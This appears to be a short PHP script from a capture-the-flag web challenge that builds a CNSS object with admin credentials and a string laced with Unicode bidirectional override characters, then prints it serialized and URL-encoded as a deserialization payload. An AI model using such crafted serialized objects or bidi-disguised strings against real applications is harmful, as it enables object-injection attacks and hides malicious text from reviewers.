<?php

class CNSS{
    public $username;
    private $i_want2_say;
    protected $password;
    function __construct(){
        $this->username = "admin";
        $this->password = "ctf";
        $this->i_want2_say = "‮⁦fssmsl⁩⁦i_like_web";
    }
}
$a = new CNSS;
echo(urlencode(serialize($a)));